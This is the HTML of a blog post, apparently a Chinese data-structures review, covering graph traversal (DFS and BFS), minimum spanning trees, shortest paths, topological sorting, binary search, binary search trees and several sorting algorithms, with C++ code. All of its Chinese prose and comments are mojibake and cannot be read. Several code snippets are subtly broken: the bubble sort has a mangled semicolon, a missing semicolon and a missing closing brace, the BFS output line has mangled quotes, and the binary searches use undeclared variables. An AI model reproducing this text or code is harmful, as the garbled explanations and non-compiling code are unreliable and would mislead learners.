<p>ç‰¹ç‚¹ï¼šè‹¥å›¾ä¸­æœ‰nä¸ªé¡¶ç‚¹ï¼Œaæ¡è¾¹</p>
<ol>
<li>æ— å‘å›¾ä¸­ï¼Œç”¨é‚»æ¥è¡¨è¡¨ç¤ºï¼Œéœ€è¦nä¸ªé¡¶ç‚¹ç»“ç‚¹ï¼Œ2aä¸ªè¾¹ç»“ç‚¹ã€‚</li>
<li>æœ‰å‘å›¾ä¸­ï¼Œç”¨é‚»æ¥è¡¨è¡¨ç¤ºï¼Œè‹¥ä¸è€ƒè™‘é€†é‚»æ¥è¡¨ï¼Œåªéœ€ n ä¸ªé¡¶ç‚¹ç»“ç‚¹ï¼Œa ä¸ªè¾¹ç»“ç‚¹ã€‚</li>
</ol>
<p><strong>ç½‘ç»œçš„é‚»æ¥è¡¨</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703010111783.png" alt="image-20200703010111783"></p>
<h2 id="å›¾çš„éå†"><a href="#å›¾çš„éå†" class="headerlink" title="å›¾çš„éå†"></a>å›¾çš„éå†</h2><h3 id="æ·±åº¦ä¼˜å…ˆéå†ï¼ˆDFSï¼‰"><a href="#æ·±åº¦ä¼˜å…ˆéå†ï¼ˆDFSï¼‰" class="headerlink" title="æ·±åº¦ä¼˜å…ˆéå†ï¼ˆDFSï¼‰"></a>æ·±åº¦ä¼˜å…ˆéå†ï¼ˆDFSï¼‰</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703011229751.png" alt="image-20200703011229751"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è¿é€šå›¾çš„æ·±åº¦éå† </span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">E</span>&gt; </span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">DFS</span> (<span class="title">Graph</span>&lt;T, E&gt;&amp; <span class="title">G</span>, <span class="title">int</span> <span class="title">v</span>, <span class="title">bool</span> <span class="title">visited</span>[]) &#123;</span>     </span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; G.getValue(v) &lt;&lt; <span class="string">' '</span>;        <span class="comment">//è®¿é—®é¡¶ç‚¹v     </span></span><br><span class="line">	visited[v] = <span class="literal">true</span>;            <span class="comment">//ä½œè®¿é—®æ ‡è®°     </span></span><br><span class="line">	<span class="keyword">int</span> w = G.getFirstNeighbor (v);     <span class="comment">//ç¬¬ä¸€ä¸ªé‚»æ¥é¡¶ç‚¹     </span></span><br><span class="line">	<span class="keyword">while</span> (w != <span class="number">-1</span>) &#123; <span class="comment">//è‹¥é‚»æ¥é¡¶ç‚¹wå­˜åœ¨       </span></span><br><span class="line">		<span class="keyword">if</span> ( !visited[w] ) DFS(G, w, visited);   <span class="comment">//è‹¥wæœªè®¿é—®è¿‡, é€’å½’è®¿é—®é¡¶ç‚¹w         </span></span><br><span class="line">	w = G.getNextNeighbor (v, w); <span class="comment">//ä¸‹ä¸€ä¸ªé‚»æ¥é¡¶ç‚¹    </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å›¾çš„æ·±åº¦ä¼˜å…ˆæœç´¢ç®—æ³• </span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">E</span>&gt;  </span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">DFSTraverse</span> (<span class="title">Graph</span>&lt;T, E&gt;&amp; <span class="title">G</span>, <span class="title">const</span> <span class="title">T</span>&amp; <span class="title">v</span>) &#123;</span> </span><br><span class="line"><span class="comment">//ä»é¡¶ç‚¹vå‡ºå‘å¯¹å›¾Gè¿›è¡Œæ·±åº¦ä¼˜å…ˆéå†çš„ä¸»è¿‡ç¨‹     </span></span><br><span class="line">	<span class="keyword">int</span> i, loc, n = G.NumberOfVertices();    <span class="comment">//é¡¶ç‚¹ä¸ªæ•°    </span></span><br><span class="line">	<span class="keyword">bool</span> *visited = <span class="keyword">new</span> <span class="keyword">bool</span>[n];          <span class="comment">//åˆ›å»ºè¾…åŠ©æ•°ç»„     </span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) visited [i] = <span class="literal">false</span>; <span class="comment">//è¾…åŠ©æ•°ç»„åˆå§‹åŒ–     </span></span><br><span class="line">	loc = G.getVertexPos(v);    </span><br><span class="line">	DFS (G, loc, visited); <span class="comment">//ä»é¡¶ç‚¹0å¼€å§‹æ·±åº¦ä¼˜å…ˆæœç´¢  </span></span><br><span class="line">	<span class="keyword">delete</span> [] visited;           <span class="comment">//é‡Šæ”¾visited </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å¹¿åº¦ä¼˜å…ˆéå†ï¼ˆBFSï¼‰"><a href="#å¹¿åº¦ä¼˜å…ˆéå†ï¼ˆBFSï¼‰" class="headerlink" title="å¹¿åº¦ä¼˜å…ˆéå†ï¼ˆBFSï¼‰"></a>å¹¿åº¦ä¼˜å…ˆéå†ï¼ˆBFSï¼‰</h3><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703012717115.png" alt="image-20200703012717115"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å›¾çš„å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³• </span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">E</span>&gt; </span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">BFS</span> (<span class="title">Graph</span>&lt;T, E&gt;&amp; <span class="title">G</span>, <span class="title">const</span> <span class="title">T</span>&amp; <span class="title">v</span>) &#123;</span>     </span><br><span class="line">	<span class="keyword">int</span> i, w, n = G.NumberOfVertices();   <span class="comment">//å›¾ä¸­é¡¶ç‚¹ä¸ªæ•°   </span></span><br><span class="line">	<span class="keyword">bool</span> *visited = <span class="keyword">new</span> <span class="keyword">bool</span>[n];     </span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) visited[i] = <span class="literal">false</span>;     </span><br><span class="line">	<span class="keyword">int</span> loc = G.getVertexPos (v);  <span class="comment">//å–é¡¶ç‚¹å·     </span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; G.getValue (loc) &lt;&lt; <span class="string">' '</span>;  <span class="comment">//è®¿é—®é¡¶ç‚¹v    </span></span><br><span class="line">	visited[loc] = <span class="literal">true</span>;           <span class="comment">//åšå·²è®¿é—®æ ‡è®°            </span></span><br><span class="line">	Queue&lt;<span class="keyword">int</span>&gt; Q;  </span><br><span class="line">  Q.EnQueue (loc);   <span class="comment">//é¡¶ç‚¹è¿›é˜Ÿåˆ—, å®ç°åˆ†å±‚è®¿é—® å›¾çš„å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³• </span></span><br><span class="line">	<span class="keyword">while</span> (!Q.IsEmpty()) &#123; <span class="comment">//å¾ªç¯, è®¿é—®æ‰€æœ‰ç»“ç‚¹         </span></span><br><span class="line">		Q.DeQueue (loc);         </span><br><span class="line">		w = G.getFirstNeighbor (loc);  <span class="comment">//ç¬¬ä¸€ä¸ªé‚»æ¥é¡¶ç‚¹         </span></span><br><span class="line">		<span class="keyword">while</span> (w != <span class="number">-1</span>) &#123;  <span class="comment">//è‹¥é‚»æ¥é¡¶ç‚¹wå­˜åœ¨            </span></span><br><span class="line">			<span class="keyword">if</span> (!visited[w]) &#123;  <span class="comment">//è‹¥æœªè®¿é—®è¿‡  </span></span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; G.getValue (w) &lt;&lt; â€˜ â€™; <span class="comment">//è®¿é—®           </span></span><br><span class="line">				visited[w] = <span class="literal">true</span>;               </span><br><span class="line">				Q.EnQueue (w);   <span class="comment">//é¡¶ç‚¹wè¿›é˜Ÿåˆ—                </span></span><br><span class="line">			&#125;           </span><br><span class="line">			w = G.getNextNeighbor (loc, w); <span class="comment">//æ‰¾é¡¶ç‚¹locçš„ä¸‹ä¸€ä¸ªé‚»æ¥ç‚¹         </span></span><br><span class="line">		&#125; </span><br><span class="line">	&#125;  </span><br><span class="line"><span class="keyword">delete</span> [] visited; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="æœ€å°ç”Ÿæˆæ ‘"><a href="#æœ€å°ç”Ÿæˆæ ‘" class="headerlink" title="æœ€å°ç”Ÿæˆæ ‘"></a>æœ€å°ç”Ÿæˆæ ‘</h2><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703020829072.png" alt="image-20200703020829072"></p>
<p>ç”»å‡ºè¯¥å›¾çš„DFSå’ŒBFSç”Ÿæˆæ ‘</p>
<p>DFSï¼š</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703020930287.png" alt="image-20200703020930287"></p>
<p>BFSï¼š<img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021006557.png" alt="image-20200703021006557"></p>
<h3 id="Primç®—æ³•"><a href="#Primç®—æ³•" class="headerlink" title="Primç®—æ³•"></a>Primç®—æ³•</h3><p>ç‰¹ç‚¹ï¼šå°†é¡¶ç‚¹å½’å¹¶</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021313306.png" alt="image-20200703021313306"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021437904.png" alt="image-20200703021437904"></p>
<h3 id="Kruskalç®—æ³•"><a href="#Kruskalç®—æ³•" class="headerlink" title="Kruskalç®—æ³•"></a>Kruskalç®—æ³•</h3><p>ç‰¹ç‚¹ï¼šå°†è¾¹å½’å¹¶</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021202383.png" alt="image-20200703021202383"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021225017.png" alt="image-20200703021225017"></p>
<h2 id="æœ€çŸ­è·¯å¾„"><a href="#æœ€çŸ­è·¯å¾„" class="headerlink" title="æœ€çŸ­è·¯å¾„"></a>æœ€çŸ­è·¯å¾„</h2><h3 id="éè´Ÿæƒå€¼çš„å•æºæœ€çŸ­è·¯å¾„"><a href="#éè´Ÿæƒå€¼çš„å•æºæœ€çŸ­è·¯å¾„" class="headerlink" title="éè´Ÿæƒå€¼çš„å•æºæœ€çŸ­è·¯å¾„"></a>éè´Ÿæƒå€¼çš„å•æºæœ€çŸ­è·¯å¾„</h3><p><strong>Dijkstraç®—æ³•</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703022317587.png" alt="image-20200703022317587"></p>
<h2 id="AOVç½‘"><a href="#AOVç½‘" class="headerlink" title="AOVç½‘"></a>AOVç½‘</h2><p><strong>AOVç½‘</strong>ï¼šåœ¨ä¸€ä¸ªæœ‰å‘å›¾ä¸­ï¼Œç”¨é¡¶ç‚¹è¡¨ç¤ºæ´»åŠ¨ï¼Œç”¨æœ‰å‘è¾¹è¡¨ç¤ºæ´»åŠ¨å…ˆåæ¬¡åºçš„æ‰§è¡Œã€‚è¿™ç§æœ‰å‘å›¾å«åšé¡¶ç‚¹è¡¨ç¤ºæ´»åŠ¨çš„AOVç½‘ç»œã€‚</p>
<p><strong>æ‹“æ‰‘æ’åº</strong>ï¼šæŒ‰ç…§æœ‰å‘å›¾ç»™å‡ºçš„æ¬¡åºå…³ç³»ï¼Œå°†å›¾ä¸­é¡¶ç‚¹æ’æˆä¸€ä¸ªçº¿æ€§åºåˆ—ï¼Œå¯¹äºæœ‰å‘å›¾ä¸­æ²¡æœ‰é™å®šæ¬¡åºå…³ç³»çš„é¡¶ç‚¹ï¼Œåˆ™å¯ä»¥äººä¸ºåŠ ä¸Šä»»æ„çš„æ¬¡åºå…³ç³»ã€‚<strong>ç”±æ­¤æ‰€å¾—é¡¶ç‚¹çš„çº¿æ€§åºåˆ—ç§°ä¸ºæ‹“æ‰‘æœ‰åºåºåˆ—</strong>ï¼Œ<strong>æ„é€ æœ‰å‘å›¾çš„ä¸€ä¸ªæ‹“æ‰‘åºåˆ—çš„è¿‡ç¨‹ç§°ä¸ºæ‹“æ‰‘æ’åº</strong>ã€‚</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703024430846.png" alt="image-20200703024430846"></p>
<p>egï¼š</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703024708515.png" alt="image-20200703024708515"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703024726671.png" alt="image-20200703024726671"></p>
<h1 id="æœç´¢"><a href="#æœç´¢" class="headerlink" title="æœç´¢"></a>æœç´¢</h1><h2 id="æŠ˜åŠæœç´¢"><a href="#æŠ˜åŠæœç´¢" class="headerlink" title="æŠ˜åŠæœç´¢"></a>æŠ˜åŠæœç´¢</h2><p><strong>åŸºæœ¬æ€æƒ³</strong>ï¼šæŠ˜åŠæœç´¢æ—¶, å…ˆæ±‚ä½äºæœç´¢åŒºé—´æ­£ä¸­çš„å¯¹è±¡çš„ä¸‹æ ‡midï¼Œç”¨å…¶å…³é”®ç ä¸ç»™å®šå€¼xæ¯”è¾ƒ:Element[mid].key == xï¼Œæœç´¢æˆåŠŸï¼›Element[mid].key &gt; xï¼ŒæŠŠæœç´¢åŒºé—´ç¼©å°åˆ°è¡¨çš„å‰åŠéƒ¨åˆ†ï¼Œç»§ç»­æŠ˜åŠæœç´¢ï¼›Element[mid].key &lt; xï¼ŒæŠŠæœç´¢åŒºé—´ç¼©å°åˆ°è¡¨çš„ååŠéƒ¨åˆ†ï¼Œç»§ç»­æŠ˜åŠæœç´¢ã€‚</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703221308152.png" alt="image-20200703221308152"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703221322312.png" alt="image-20200703221322312"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinSearch1</span><span class="params">(<span class="keyword">int</span> r[ ], <span class="keyword">int</span> n, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;                                  <span class="comment">//æ•°ç»„r[1] ~ r[n]å­˜æ”¾æŸ¥æ‰¾é›†åˆ</span></span><br><span class="line">    low = <span class="number">1</span>; high = n;</span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high)                   </span><br><span class="line">    &#123;</span><br><span class="line">       mid = (low + high) / <span class="number">2</span>;            </span><br><span class="line">       <span class="keyword">if</span> (k &lt; r[mid])  high = mid - <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> (k &gt; r[mid])  low = mid + <span class="number">1</span>; </span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinSearch2</span><span class="params">(<span class="keyword">int</span> r[ ], <span class="keyword">int</span> low, <span class="keyword">int</span> high, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;                              <span class="comment">//æ•°ç»„r[1] ~ r[n]å­˜æ”¾æŸ¥æ‰¾é›†åˆ</span></span><br><span class="line">    <span class="keyword">if</span> (low &gt; high) <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">       mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">       <span class="keyword">if</span> (k &lt; r[mid]) </span><br><span class="line">           <span class="keyword">return</span> BinSearch2(r, low, mid<span class="number">-1</span>, k);</span><br><span class="line">       <span class="keyword">else</span>  <span class="keyword">if</span> (k &gt; r[mid]) </span><br><span class="line">                   <span class="keyword">return</span> BinSearch2(r, mid+<span class="number">1</span>, high, k); </span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h2 id="äºŒå‰æœç´¢æ ‘"><a href="#äºŒå‰æœç´¢æ ‘" class="headerlink" title="äºŒå‰æœç´¢æ ‘"></a>äºŒå‰æœç´¢æ ‘</h2><p>å®šä¹‰ï¼šäºŒå‰æœç´¢æ ‘æ˜¯å…·æœ‰ä»¥ä¸‹æ€§è´¨çš„äºŒå‰æ ‘</p>
<ol>
<li>æ‰€æœ‰ç»“ç‚¹çš„å…³é”®ç äº’ä¸ç›¸åŒã€‚</li>
<li>å·¦å­æ ‘ï¼ˆå¦‚æœéç©ºï¼‰ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å…³é”®ç éƒ½å°äºæ ¹ç»“ç‚¹çš„å…³é”®ç ã€‚</li>
<li>å³å­æ ‘ï¼ˆå¦‚æœéç©ºï¼‰ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å…³é”®ç éƒ½å¤§äºæ ¹ç»“ç‚¹çš„å…³é”®ç ã€‚</li>
<li>å·¦å­æ ‘å’Œå³å­æ ‘ä¹Ÿæ˜¯äºŒå‰æœç´¢æ ‘ã€‚</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æœç´¢ç®—æ³•</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">E</span>, <span class="title">class</span> <span class="title">K</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">BSTNode</span>&lt;E, K&gt;* <span class="title">BST</span>&lt;E, K&gt;:</span>: Search (<span class="keyword">const</span> K x, BSTNode&lt;E, K&gt; *ptr) </span><br><span class="line">&#123;     </span><br><span class="line">	<span class="keyword">if</span> (ptr == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;      </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (x &lt; ptr-&gt;data) <span class="keyword">return</span> Search(x, ptr-&gt;left);     </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (x &gt; ptr-&gt;data) <span class="keyword">return</span> Search(x, ptr-&gt;right);     </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> ptr;    <span class="comment">//æœç´¢æˆåŠŸ </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="äºŒå‰æœç´¢æ ‘çš„æ’å…¥"><a href="#äºŒå‰æœç´¢æ ‘çš„æ’å…¥" class="headerlink" title="äºŒå‰æœç´¢æ ‘çš„æ’å…¥"></a>äºŒå‰æœç´¢æ ‘çš„æ’å…¥</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ’å…¥</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">E</span>, <span class="title">class</span> <span class="title">K</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">BST</span>&lt;E, K&gt;:</span>:Insert (<span class="keyword">const</span> E&amp; e1,   BSTNode&lt;E, K&gt; *&amp; ptr)</span><br><span class="line"> &#123;	  <span class="comment">//æ³¨æ„å‚æ•°å½¢å¼ </span></span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>) &#123;	   <span class="comment">//æ–°ç»“ç‚¹ä½œä¸ºå¶ç»“ç‚¹æ’å…¥</span></span><br><span class="line">        ptr = <span class="keyword">new</span> BstNode&lt;E, K&gt;(e1);	  <span class="comment">//åˆ›å»ºæ–°ç»“ç‚¹</span></span><br><span class="line">        <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)&#123; <span class="built_in">cerr</span> &lt;&lt; <span class="string">"Out of space"</span> &lt;&lt; <span class="built_in">endl</span>;  <span class="built_in">exit</span>(<span class="number">1</span>); &#125;</span><br><span class="line">	    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (e1 &lt; ptr-&gt;data) <span class="keyword">return</span> Insert (e1, ptr-&gt;left);	 			 </span><br><span class="line">  	<span class="keyword">else</span> <span class="keyword">if</span> (e1 &gt; ptr-&gt;data) <span class="keyword">return</span> Insert (e1, ptr-&gt;right);			 </span><br><span class="line">  	<span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">//xå·²åœ¨æ ‘ä¸­,ä¸å†æ’å…¥</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223024868.png" alt="image-20200703223024868"></p>
<h3 id="äºŒå‰æœç´¢æ ‘çš„åˆ é™¤"><a href="#äºŒå‰æœç´¢æ ‘çš„åˆ é™¤" class="headerlink" title="äºŒå‰æœç´¢æ ‘çš„åˆ é™¤"></a>äºŒå‰æœç´¢æ ‘çš„åˆ é™¤</h3><p>æœ‰ä¸‰ç§æƒ…å†µï¼š</p>
<ol>
<li>è¢«åˆ çš„ç»“ç‚¹æ˜¯å¶å­</li>
<li>è¢«åˆ ç»“ç‚¹åªæœ‰å·¦å­æ ‘æˆ–åªæœ‰å³å­æ ‘</li>
<li>è¢«åˆ ç»“ç‚¹æ—¢æœ‰å·¦å­æ ‘åˆæœ‰å³å­æ ‘</li>
</ol>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223603100.png" alt="image-20200703223603100"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223624325.png" alt="image-20200703223624325"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703223643364.png" alt="image-20200703223643364"></p>
<h1 id="æ’åº"><a href="#æ’åº" class="headerlink" title="æ’åº"></a>æ’åº</h1><p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703030054652.png" alt="image-20200703030054652"></p>
<h2 id="ç›´æ¥æ’å…¥æ’åº"><a href="#ç›´æ¥æ’å…¥æ’åº" class="headerlink" title="ç›´æ¥æ’å…¥æ’åº"></a>ç›´æ¥æ’å…¥æ’åº</h2><p><strong>åŸºæœ¬æ€æƒ³ï¼šåœ¨æ’å…¥ç¬¬ iï¼ˆiï¼1ï¼‰ä¸ªè®°å½•æ—¶ï¼Œå‰é¢çš„ i-1ä¸ªè®°å½•å·²ç»æ’å¥½åºã€‚</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703200120034.png" alt="image-20200703200120034"></p>
<p><strong>å¹³å‡æƒ…å†µä¸‹æ’åºçš„æ—¶é—´å¤æ‚åº¦ä¸º o(n2)ã€‚<br>ç›´æ¥æ’å…¥æ’åºæ˜¯ä¸€ç§ç¨³å®šçš„æ’åºæ–¹æ³•ã€‚</strong></p>
<h2 id="å¸Œå°”æ’åº"><a href="#å¸Œå°”æ’åº" class="headerlink" title="å¸Œå°”æ’åº"></a>å¸Œå°”æ’åº</h2><p><strong>åŸºæœ¬æ€æƒ³ï¼šå°†æ•´ä¸ªå¾…æ’åºè®°å½•åˆ†å‰²æˆè‹¥å¹²ä¸ªå­åºåˆ—ï¼Œåœ¨å­åºåˆ—å†…åˆ†åˆ«è¿›è¡Œç›´æ¥æ’å…¥æ’åºï¼Œå¾…æ•´ä¸ªåºåˆ—ä¸­çš„è®°å½•åŸºæœ¬æœ‰åºæ—¶ï¼Œå¯¹å…¨ä½“è®°å½•è¿›è¡Œç›´æ¥æ’å…¥æ’åºã€‚</strong></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201115198.png" alt="image-20200703201115198"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201212433.png" alt="image-20200703201212433"></p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201232582.png" alt="image-20200703201232582"></p>
<p>gapé€šå¸¸å–ï¼š</p>
<p>$gap=\lfloor gap/3\rfloor+1$</p>
<p><strong>å¸Œå°”æ’åºæ˜¯ä¸€ç§ä¸ç¨³å®šçš„æ’åºç®—æ³•ã€‚</strong></p>
<p>egï¼š</p>
<p><img src="/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703201916100.png" alt="image-20200703201916100"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¸Œå°”æ’åºçš„ç®—æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shellsort</span> <span class="params">(dataList&lt;T&gt;&amp; L, <span class="keyword">const</span> <span class="keyword">int</span> left, <span class="keyword">const</span> <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"> </span>&#123; <span class="keyword">int</span> i, j, gap = right-left+<span class="number">1</span>; <span class="comment">//å¢é‡çš„åˆå§‹å€¼ä¸ºå¾…æ’åºä¸ªæ•°</span></span><br><span class="line">	Element&lt;T&gt; temp;</span><br><span class="line">    <span class="keyword">do</span> &#123;  	gap = gap/<span class="number">3</span>+<span class="number">1</span>;			<span class="comment">//æ±‚ä¸‹ä¸€å¢é‡å€¼</span></span><br><span class="line">        		<span class="keyword">for</span>(i=left+gap;i&lt;=right;i++)</span><br><span class="line">           	 	<span class="keyword">if</span> (L[i]&lt;L[i-gap]) &#123;<span class="comment">//é€†åº</span></span><br><span class="line">                			temp=L[i];</span><br><span class="line">                			j = i-gap;</span><br><span class="line">                			<span class="keyword">do</span> &#123;</span><br><span class="line">                   			L[j+gap] = L[j];</span><br><span class="line">                        j= j-gap;</span><br><span class="line">                			&#125; <span class="keyword">while</span> (j&gt;=left &amp;&amp; temp&lt;L[j]);</span><br><span class="line">               			L[j+gap]=temp;	<span class="comment">//å°†vector[i]å›é€</span></span><br><span class="line">           		&#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (gap &gt; <span class="number">1</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="å†’æ³¡æ’åº"><a href="#å†’æ³¡æ’åº" class="headerlink" title="å†’æ³¡æ’åº"></a>å†’æ³¡æ’åº</h2><p><strong>åŸºæœ¬æ€æƒ³ï¼šä¸¤ä¸¤æ¯”è¾ƒç›¸é‚»è®°å½•çš„å…³é”®ç ï¼Œå¦‚æœååºåˆ™äº¤æ¢ï¼Œç›´åˆ°æ²¡æœ‰ååºçš„è®°å½•ä¸ºæ­¢ã€‚</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BubbleSort</span> <span class="params">(T V[], <span class="keyword">int</span> n )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">bool</span> exchange ;   <span class="keyword">int</span> i , j ;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">	exchange = <span class="literal">false</span>;		 <span class="comment">//æ ‡å¿—ä¸º0å‡å®šæœªäº¤æ¢</span></span><br><span class="line">	<span class="keyword">for</span> (j=n<span class="number">-1</span>;j&gt;= iï¼›j--)     </span><br><span class="line"> 		<span class="keyword">if</span> (V[j<span class="number">-1</span>]&gt;V[j]) &#123; 	<span class="comment">//é€†åº</span></span><br><span class="line">                T temp=V[j<span class="number">-1</span>];  V[j<span class="number">-1</span>]=V[j]; V[j]=temp<span class="comment">//äº¤æ¢</span></span><br><span class="line">	            exchange = <span class="literal">true</span>;      <span class="comment">//æ ‡å¿—ç½®ä¸º1,æœ‰äº¤æ¢</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">if</span>(exchange==<span class="literal">false</span>) <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
